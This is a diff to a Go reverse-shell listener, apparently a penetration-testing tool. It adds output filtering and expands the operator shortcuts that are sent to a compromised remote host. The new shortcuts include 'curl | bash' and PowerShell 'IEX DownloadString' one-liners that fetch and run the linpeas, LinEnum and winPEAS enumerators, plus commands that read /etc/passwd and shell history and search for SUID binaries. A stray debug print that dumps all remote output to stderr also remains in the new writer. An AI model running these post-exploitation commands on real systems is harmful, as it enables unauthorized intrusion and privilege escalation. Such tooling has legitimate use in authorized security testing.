@@ -1,6 +1,7 @@
 package cmd
 
 import (
+	"bytes"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/tls"
@@ -88,10 +89,14 @@ var listenCmd = &cobra.Command{
 
 In relay mode, operator shortcuts are intercepted locally instead of
 being sent to the remote shell:
-  shell    Upgrade the remote shell to an interactive PTY shell
-  linpeas  Fetch and run linpeas on the remote host`,
-	Args:    cobra.RangeArgs(1, 2),
-	Run:     runListen,
+  shell/bash/zsh  Upgrade to an interactive PTY shell
+  linpeas/linenum Fetch and run remote enumerators (Linux)
+  winpeas         Fetch and run winPEAS (Windows)
+  sysinfo         Kernel, identity and working directory
+  suid            SUID binaries; caps: capabilities
+  cron            Cron jobs; users: /etc/passwd; hist: shell history`,
+	Args: cobra.RangeArgs(1, 2),
+	Run:  runListen,
 }
 
 func init() {
@@ -636,7 +641,7 @@ func handleConnection(conn net.Conn) {
 	// terminal rendering compounds into garbage.
 	if !foregroundMu.TryLock() {
 		logger.Warn("Connection from %s is in the background (stdin is owned by another connection)", conn.RemoteAddr())
-		if _, err := io.Copy(ttyCRLFWriter(os.Stdout), applyProtocolWrappers(conn)); err != nil {
+		if _, err := io.Copy(&relayWriter{inner: ttyCRLFWriter(os.Stdout)}, applyProtocolWrappers(conn)); err != nil {
 			logger.Debug("Background connection ended: %v", err)
 		}
 		return
@@ -668,6 +673,60 @@ func ttyCRLFWriter(w io.Writer) io.Writer {
 		return &crlfWriter{writer: w}
 	}
 	return w
+}
+
+// noisePhrases are dropped from remote output. Interactive shells without
+// a TTY print these job-control warnings on startup; they carry no signal.
+var noisePhrases = []string{
+	"cannot set terminal process group",
+	"no job control in this shell",
+}
+
+// relayWriter routes remote output to the operator terminal: it drops
+// known-noisy shell startup lines and, on interactive terminals, prints
+// above the readline prompt so incoming bytes don't tear the typed line.
+// A trailing partial line (e.g. a shell prompt) passes through untouched.
+type relayWriter struct {
+	ed    *readline.Editor
+	inner io.Writer
+}
+
+func (w *relayWriter) Write(p []byte) (int, error) {
+	fmt.Fprintf(os.Stderr, "[DBG] len=%d %q\n", len(p), string(p))
+	if w.ed == nil || !term.IsTerminal(int(os.Stdout.Fd())) {
+		return w.inner.Write(dropNoiseLines(p))
+	}
+	clean := dropNoiseLines(p)
+	if len(clean) > 0 {
+		w.ed.PrintAbove(string(clean))
+	}
+	return len(p), nil
+}
+
+// dropNoiseLines removes complete lines containing known noise phrases.
+func dropNoiseLines(p []byte) []byte {
+	var clean []byte
+	start := 0
+	for start < len(p) {
+		i := bytes.IndexByte(p[start:], '\n')
+		if i < 0 {
+			clean = append(clean, p[start:]...)
+			break
+		}
+		line := p[start : start+i+1]
+		noisy := false
+		for _, n := range noisePhrases {
+			if bytes.Contains(line, []byte(n)) {
+				noisy = true
+				break
+			}
+		}
+		if !noisy {
+			clean = append(clean, line...)
+		}
+		start += i + 1
+	}
+	return clean
 }
 
 // splitHostPort extracts IP and port from a net.Addr without panicking on
@@ -745,7 +804,7 @@ func handleSessionConnection(conn net.Conn) {
 
 	// Keep connection alive: read from the session and pipe to stdout if attached
 	sess.PumpActive = true
-	ttyOut := ttyCRLFWriter(os.Stdout)
+	ttyOut := &relayWriter{inner: ttyCRLFWriter(os.Stdout)}
 	buf := make([]byte, 16384)
 	for {
 		n, err := sess.Recv(buf)
@@ -767,8 +826,19 @@ func handleSessionConnection(conn net.Conn) {
 var relayShortcuts = map[string]string{
 	// Upgrade the raw socket shell to an interactive PTY shell.
 	"shell": `python3 -c 'import pty; pty.spawn("/bin/sh")'`,
-	// Fetch and run linpeas on the remote host.
+	"bash":  `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
+	"zsh":   `python3 -c 'import pty; pty.spawn("/bin/zsh")'`,
+	// Fetch and run enumerators on the remote host.
 	"linpeas": `curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash`,
+	"linenum": `curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`,
+	"winpeas": `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat')"`,
+	// Quick local enumeration one-liners.
+	"sysinfo": `uname -a && id && pwd`,
+	"suid":    `find / -perm -4000 -type f 2>/dev/null`,
+	"caps":    `getcap -r / 2>/dev/null | head -30`,
+	"cron":    `ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null`,
+	"users":   `cat /etc/passwd`,
+	"hist":    `tail -50 ~/.bash_history 2>/dev/null`,
 }
 
 // runRelayShortcut handles one input line locally. It reports whether the
@@ -841,15 +911,19 @@ func handleNormal(conn net.Conn) error {
 		doneOnce.Do(func() { close(done) })
 	}
 
-	// Goroutine: Read from connection and write to stdout
-	go func() {
-		io.Copy(stdoutWriter, conn)
-		closeDone()
-	}()
-
 	// Create readline editor - no prompt, but with full features
 	editor := readline.NewEditor()
 	editor.SetPrompt("") // No prompt - remote shell's prompt will show
+
+	// Route connection output and logs above the prompt so neither tears
+	// the line being typed. Restored when the connection ends.
+	relayOut := &relayWriter{ed: editor, inner: stdoutWriter}
+
+	// Goroutine: Read from connection and write to stdout
+	go func() {
+		io.Copy(relayOut, conn)
+		closeDone()
+	}()
 
 	// Set history file
 	if homeDir, err := os.UserHomeDir(); err == nil {
